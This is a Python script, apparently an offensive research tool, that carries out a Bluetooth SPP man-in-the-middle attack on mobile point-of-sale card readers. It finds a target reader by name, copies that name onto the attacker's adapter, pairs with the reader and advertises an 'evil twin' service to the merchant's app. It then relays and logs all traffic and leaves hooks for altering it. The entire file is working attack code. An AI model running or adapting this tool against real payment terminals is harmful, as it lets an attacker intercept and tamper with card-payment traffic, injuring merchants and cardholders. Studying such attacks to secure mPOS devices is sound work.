#!/usr/bin/env python
"""
A simple bluetooth mitm sniffer for spp
"""

from bluetooth import *
import select
import re
import time
import pexpect
import subprocess
import logging
from hexdump import hexdump


logging.basicConfig(filename='mitm_bluetooth_edr.log',
                    level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(name)s:%(message)s')
log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logger = logging.getLogger("pritiado")
logger_traffic = logging.getLogger("edr_traffic")

stream_handler = logging.StreamHandler(stream=sys.stdout)
formatter = logging.Formatter(log_format)
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)

qpos_regex = '^SR[0-9]{10}$'
magicpos_regex = ''
banner = "\n" \
         "///////////////////////////////////////\n" \
         "░█▀█░█▀▄░▀█▀░▀█▀░▀█▀░█▀█░█░█///////////\n" \
         "░█▀▀░█▀▄░░█░░░█░░░█░░█▀█░█░█///////////\n" \
         "░▀░░░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀///////////\n" \
         "///////////////////////////////////////\n" \
         "A simple bluetooth mitm sniffer for spp"

def regex_match(match):
    return re.match(qpos_regex, match)


def has_message_to_receive(socket):
    ready_to_read, _, _ = select.select([socket], [], [], 0)
    return socket in ready_to_read


class Bluetoothctl:
    """A wrapper for bluetoothctl utility."""

    def __init__(self):
        subprocess.check_output("rfkill unblock bluetooth", shell=True)
        self.process = pexpect.spawnu("bluetoothctl", echo=False)

    def send(self, command, pause=0):
        self.process.send(f"{command}\n")
        time.sleep(pause)
        if self.process.expect(["bluetooth", pexpect.EOF]):
            raise Exception(f"failed after {command}")

    def get_output(self, *args, **kwargs):
        """Run a command in bluetoothctl prompt, return output as a list of lines."""
        self.send(*args, **kwargs)
        return self.process.before.split("\r\n")

    def start_scan(self):
        """Start bluetooth scanning process."""
        try:
            self.send("scan on")
        except Exception as e:
            logger.error(e)

    def make_discoverable(self):
        """Make device discoverable."""
        try:
            self.send("discoverable on")
        except Exception as e:
            logger.error(e)

    def parse_device_info(self, info_string):
        """Parse a string corresponding to a device."""
        device = {}
        block_list = ["[\x1b[0;", "removed"]
        if not any(keyword in info_string for keyword in block_list):
            try:
                device_position = info_string.index("Device")
            except ValueError:
                pass
            else:
                if device_position > -1:
                    attribute_list = info_string[device_position:].split(" ", 2)
                    device = {
                        "mac_address": attribute_list[1],
                        "name": attribute_list[2],
                    }
        return device

    def get_available_devices(self):
        """Return a list of tuples of paired and discoverable devices."""
        available_devices = []
        try:
            out = self.get_output("devices")
        except Exception as e:
            logger.error(e)
        else:
            for line in out:
                device = self.parse_device_info(line)
                if device:
                    available_devices.append(device)
        return available_devices

    def get_paired_devices(self):
        """Return a list of tuples of paired devices."""
        paired_devices = []
        try:
            out = self.get_output("paired-devices")
        except Exception as e:
            logger.error(e)
        else:
            for line in out:
                device = self.parse_device_info(line)
                if device:
                    paired_devices.append(device)
        return paired_devices

    def get_discoverable_devices(self):
        """Filter paired devices out of available."""
        available = self.get_available_devices()
        paired = self.get_paired_devices()
        return [d for d in available if d not in paired]

    def get_device_info(self, mac_address):
        """Get device info by mac address."""
        try:
            out = self.get_output(f"info {mac_address}")
        except Exception as e:
            logger.error(e)
            return False
        else:
            return out

    def pair(self, mac_address):
        """Try to pair with a device by mac address."""
        try:
            self.send(f"pair {mac_address}", 4)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["Failed to pair", "Pairing successful", pexpect.EOF]
            )
            return res == 1

    def trust(self, mac_address):
        try:
            self.send(f"trust {mac_address}", 4)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["Failed to trust", "Pairing successful", pexpect.EOF]
            )
            return res == 1

    def remove(self, mac_address):
        """Remove paired device by mac address, return success of the operation."""
        try:
            self.send(f"remove {mac_address}", 3)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["not available", "Device has been removed", pexpect.EOF]
            )
            return res == 1

    def connect(self, mac_address):
        """Try to connect to a device by mac address."""
        try:
            self.send(f"connect {mac_address}", 2)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["Failed to connect", "Connection successful", pexpect.EOF]
            )
            return res == 1

    def disconnect(self, mac_address):
        """Try to disconnect to a device by mac address."""
        try:
            self.send(f"disconnect {mac_address}", 2)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["Failed to disconnect", "Successful disconnected", pexpect.EOF]
            )
            return res == 1

    def set_alias(self, alias):
        """Try to rename the adaptor to match the target device name."""
        try:
            self.send("system-alias " + alias)
        except Exception as e:
            logger.error(e)
            return False
        else:
            res = self.process.expect(
                ["Changing " + alias + " succeeded", pexpect.EOF]
            )
        return res == 1

# here implement the editions to data in traveling to the mpos
def handle_data_to_mpos(req):
    return req

# here implement the editions to data in traveling to the mobile app
def handle_data_to_app(req):
    return req


if __name__ == "__main__":
    logger.info(banner)
    logger.info("Init bluetooth...")
    bl = Bluetoothctl()
    logger.info("Ready!")
    bl.start_scan()
    logger.info("Looking for matching device...")
    found = False
    target_device = None
    while not found:
        devices = bl.get_discoverable_devices()
        for device in devices:
            # if regex_match(device["name"]):
            if (device["name"] == "SR1062682070"): #put whatever you want or just match with a regex
                found = True
                target_device = device
                break
        time.sleep(0.1)
    logger.info("Device found: " + target_device["name"] + " mac: " + target_device["mac_address"])
    logger.info("Changing adaptor name")
    bl.set_alias(target_device["name"])
    logger.info("Pairing to device")
    bl.pair(target_device["mac_address"])
    logger.info("Connecting to Mpos")
    # Define the Bluetooth device address and port
    port = 1
    # Connect to the device
    mpos_sock = BluetoothSocket(RFCOMM)
    mpos_sock.connect((target_device["mac_address"], port))
    logger.info("Slave: Connected to " + target_device["name"] + " mac: " + target_device["mac_address"])

    bl = Bluetoothctl()
    logger.info("Creating evil twin")
    logger.info("Advertising mpos bluetooth device")
    mobile_sock = BluetoothSocket(RFCOMM)
    mobile_sock.bind(("", PORT_ANY))
    mobile_sock.listen(1)
    port = mobile_sock.getsockname()[1]
    uuid = "94f39d29-7d6d-437d-973b-fba39e49d4ee"
    advertise_service(mobile_sock, "TestServer",
                      service_id=uuid,
                      service_classes=[uuid, SERIAL_PORT_CLASS],
                      profiles=[SERIAL_PORT_PROFILE],
                      )
    logger.info("Advertisement done")

    # needed
    time.sleep(1)

    logger.info("Waiting for app connection")
    logger.info("Waiting for connection on RFCOMM channel " + str(port))
    client_sock, client_info = mobile_sock.accept()
    logger.info("Accepted connection from " + str(client_info))
    time.sleep(1)
    logger.info("Everything done, mitm successful. Traffic will be saved in mitm_bluetooth_edr.log:")
    logger.info(">> : data from app")
    logger.info("<< : data from mpos")
    req = ""
    data = ""

    while True:
        req = ""
        data = ""

        try:
            if has_message_to_receive(client_sock):
                req = client_sock.recv(1024)
                print(hexdump(data))
            if has_message_to_receive(mpos_sock):
                data = mpos_sock.recv(1024)
                print(hexdump(data))
            if len(req) != 0:
                logger_traffic.info(">> " + str(req))
                mpos_sock.send(handle_data_to_mpos(req))
            if len(data) != 0:
                logger_traffic.info("<< " + str(data))
                client_sock.send(handle_data_to_app(data))
        except IOError:
            pass

        except KeyboardInterrupt:

            logger.info("disconnected")

            client_sock.close()
            mobile_sock.close()
            logger.info("all done")

            break

